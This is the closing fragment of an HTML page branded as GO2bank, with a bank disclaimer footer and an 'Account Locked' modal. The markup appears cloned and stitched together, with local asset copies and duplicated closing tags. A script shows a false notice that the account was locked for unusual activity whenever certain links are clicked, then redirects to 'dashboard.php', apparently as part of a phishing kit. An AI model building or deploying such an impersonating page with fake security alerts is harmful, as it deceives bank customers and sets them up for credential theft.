<div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">

    
    
<div class="xf-content-height">
    
   
        

<footer id="g2b-footer" class="g2b-footer py-10">
    <div class="grid-container g2b-footer__container">
        
        <div class="go2bank-redesign"><div class="grid-row g2b-footer__disclaimer content-card" style="margin-bottom: 0.0px;text-align: center;">
            <p><span class="body-xs">Cards issued by GO2bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association.</span></p>
             <p><span class="body-xs">Neither GO2bank, Green Dot Corporation, Visa U.S.A. nor any of their respective affiliates are responsible for the products or services provided by Ingo Money, Q2 Software, Plaid, Atomic or any eGift Card merchants. Partner terms and conditions apply.</span></p>
            <p><span class="body-xs">Apple, the Apple logo, and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries. App Store is a service mark of Apple Inc.</span></p>
            <p><span class="body-xs">Google, Android and Google Play are trademarks of Google Inc., registered in the U.S. and other countries.</span></p>
            <p><span class="body-xs">©2024 GO2bank. GO2bank is a trademark of Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.</span></p>
            
    </div>
        
       
    </div>
</footer>
 
    

    
</div>

</div>
<!-- Modal -->
<div id="accountLockModal" class="fixed inset-0 flex items-center justify-center bg-gray-800 bg-opacity-50 hidden">
        <div class="bg-white w-11/12 md:w-1/3 rounded-lg shadow-lg">
            <div class="flex items-center justify-center pt-4">
                <svg class="w-12 h-12 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01M19 9l-7 7-7-7"/>
                </svg>
            </div>
            <div class="p-6 text-center">
                <h2 class="text-2xl font-semibold mb-4">Account Locked</h2>
                <p class="text-gray-600">Unfortunately, your account has been locked temporarily due to unusual activity.</p>
            </div>
            <div class="px-6 pb-6">
                <button id="closeModal" class="w-full bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700">
                    Okay
                </button>
            </div>
        </div>
    </div>

    <script>
        // JavaScript to handle modal display
        document.querySelectorAll('.trigger-modal').forEach(function(element) {
            element.addEventListener('click', function(event) {
                event.preventDefault();
                document.getElementById('accountLockModal').classList.remove('hidden');
            });
        });

        document.getElementById('closeModal').addEventListener('click', function() {
            window.location.href = 'dashboard.php';
        });
    </script>

</body>
</html>



            
    
    
  
    
<script src="./etc.clientlibs/flexweb/clientlibs/flexweb-base.min.22f4dda9080d0f2af2b152473f9fcc01.js"></script>
<script src="./etc.clientlibs/go2bank/clientlibs/go2bank-site.min.18fd909294c599f0501b63be17f0b39b.js"></script>   
<link rel="stylesheet" href="./etc.clientlibs/flexweb/clientlibs/flexweb-fonts.min.38d414ed3cd39844cb82a3d4ddaf4838.css" type="text/css">

  
    

    

    



    
    
    

            

        
    </body>
    </main>


</html>
